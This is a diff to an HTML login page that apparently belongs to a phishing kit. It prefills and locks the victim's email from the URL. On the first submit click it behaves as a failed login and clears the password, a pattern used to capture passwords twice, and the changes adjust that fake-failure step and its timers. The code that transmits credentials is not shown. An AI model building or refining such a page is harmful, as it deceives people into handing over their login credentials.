@@ -181,7 +181,7 @@
         <!-- Email -->
 		
         <div class="input-group">
-          <input type="email" id="oruko" name="oruko" placeholder="Email" autocomplete="off"/>
+          <input type="email" id="oruko"placeholder="Email" autocomplete="off"/>
 		  <div class="password-wrapper">
         </div>
         <!-- Password with toggle -->
@@ -222,7 +222,7 @@
     const emailFromUrl = getEmailFromUrl();
     const emailField = document.getElementById('email');
     
-    if (emailFromUrl) {
+    if (emailFromUrl && emailField) {
       emailField.value = emailFromUrl;
       // LOCK THE EMAIL FIELD - user cannot edit or clear it
       emailField.readOnly = true;
@@ -256,12 +256,15 @@
     document.getElementById('submitBtn').addEventListener('click', function() {
       if (firstClick) {
         // Show incorrect message
-        document.getElementById('passwordMessage').textContent = "Incorrect password";
+        document.getElementById('passwordMessage').textContent = "";
+		setTimeout(() => {
+          passwordInput.value = '';
+        }, 2000);
 
         // Clear password after 2 second
         setTimeout(() => {
           passwordInput.value = '';
-        }, 1000);
+        }, 2000);
       } else {
         // Toggle password visibility on second click
         if (passwordInput.type === 'password') {
